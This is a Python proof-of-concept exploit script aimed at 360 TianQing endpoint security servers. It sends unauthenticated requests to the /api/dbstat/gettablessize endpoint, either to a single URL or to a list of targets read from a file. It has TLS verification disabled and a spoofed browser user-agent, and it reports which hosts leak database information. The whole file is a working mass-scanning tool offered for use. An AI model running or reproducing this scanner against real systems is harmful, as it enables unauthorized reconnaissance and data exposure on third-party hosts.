#coding: utf-8
import requests
import sys
import re
import urllib3

G = '\033[32m'  # 绿
Y = '\033[33m'  # 黄
B = '\033[34m'  # 蓝
R = '\033[35m'  # 红
E = '\033[0m'  # 结束
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36'
}


def title():
    print(G, '<<<<<  360 TianQing Infomation dDsclosure POC Code By Lsadaharu  >>>>>', E)
    print(G, '<<<<<  Usage_1->python3 exp.py -u vul_url   >>>>>', E)
    print(G, '<<<<<  Usage_2->python3 exp.py -f test.txt  >>>>>', E)


def input_options():
    if len(sys.argv) == 3:
        if sys.argv[1].startswith('-'):
            option = sys.argv[1][1:]
            if option == 'u' and sys.argv[2].startswith(('https', 'http')):
                Usage_1_Poc(sys.argv[2])
            elif option == 'f':
                Usage_2_Poc(sys.argv[2])
            else:
                print(R+"[-] Error:"+E, "Unuseful Parameter")
        else:
            print(R+"[-] Error:"+E, "Parameter Failed")
            sys.exit()

    else:
        print(R+"[-]"+E, "Usage Failed")
        print(G, '<<<<<  Usage_1->python3 exp.py -u vul_url   >>>>>', E)
        print(G, '<<<<<  Usage_2->python3 exp.py -f test.txt  >>>>>', E)


def Usage_1_Poc(target):

    try:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        verify_code = requests.get('{}/api/dbstat/gettablessize'.format(target), headers=headers, verify=False, timeout=5)
        if "success" in verify_code.text:
            print(Y,"[+] {} Information Disclosure Exists".format(target),E)
        else:
            print(B,"[-] No Vulnerability",E)
    except Exception:
        print(R,"[-] Payload Send Failed".format(target),E)


def Usage_2_Poc(file):
    try:
        with open(file, 'r') as file:
            target_list = file.readlines()
            for url in target_list:
                target=url.strip()
                try:
                    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                    verify_code = requests.get('{}/api/dbstat/gettablessize'.format(target), headers=headers, verify=False, timeout=5)
                    if "success" in verify_code.text:
                        print(Y,"[+] {} Information Disclosure Exists".format(target),E)
                    else:
                        print(B,"[-] {} No Vulnerability".format(target),E)
                except Exception:
                    print(R,"[*] {} Payload Send Failed".format(target),E)
    except Exception:
        print("Target File Open Failed")
    file.close()


if __name__ == "__main__":
    title()
    input_options()
